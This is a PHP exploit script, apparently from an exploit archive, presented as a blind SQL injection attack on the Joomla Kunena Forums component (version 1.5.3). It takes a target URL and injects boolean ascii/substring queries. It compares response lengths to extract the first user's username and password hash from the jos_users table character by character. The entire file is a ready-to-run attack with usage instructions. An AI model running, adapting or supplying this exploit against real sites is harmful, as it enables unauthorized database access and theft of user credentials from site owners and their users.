<?php
ini_set("max_execution_time",0);
print_r('
##############################################################################
#
#         Joomla Kunena Forums (func) Blind SQL Injection Exploit
#
#                          MEFISTO  a.k.a  ilkerkandemir
#                        mefisto [at] hackermail . com
#                            (IMT) imhatimi.org                          
#                         Usage: target.php [site][SQL]
#
##############################################################################
');
if ($argc > 1) {
$url = $argv[1];
$r = strlen(file_get_contents($url."+and+1=1--"));
echo "\nExploiting:\n";
$w = strlen(file_get_contents($url."+and+1=0--"));
$t = abs((100-($w/$r*100)));
echo "Username: ";
for ($i=1; $i <= 30; $i++) {
$laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+jos_users+limit+0,1),".$i.",1))!=0--"));
   if (abs((100-($laenge/$r*100))) > $t-1) {
      $count = $i;
      $i = 30;
   }
}
for ($j = 1; $j < $count; $j++) {
   for ($i = 46; $i <= 122; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+jos_users+limit+0,1),".$j.",1))%3E".$i."--"));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+jos_users+limit+0,1),".$j.",1))%3E".($i-1)."--"));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 122;
      }
   }
}
echo "\nPassword: ";
for ($j = 1; $j <= 49; $j++) {
   for ($i = 46; $i <= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+jos_users+limit+0,1),".$j.",1))%3E".$i."--"));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+jos_users+limit+0,1),".$j.",1))%3E".($i-1)."--"));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
        $i = 122;
      }
   }
}
} else {
echo "\nExploiting Failed \n";
}

/*
Note:
<name>Kunena</name>
<version>1.5.3</version>
<versionname>Spreek</versionname>
<creationDate>2009-06-15</creationDate>
<build>1688</build>
<author>www.Kunena.com</author>
<authorEmail>Kunena@Kunena.com</authorEmail>
<authorUrl>http://www.Kunena.com</authorUrl>
<copyright>www.Kunena.com</copyright>
<license>GNU/GPL</license>
<description>Kunena Forum</description>
*/
?>
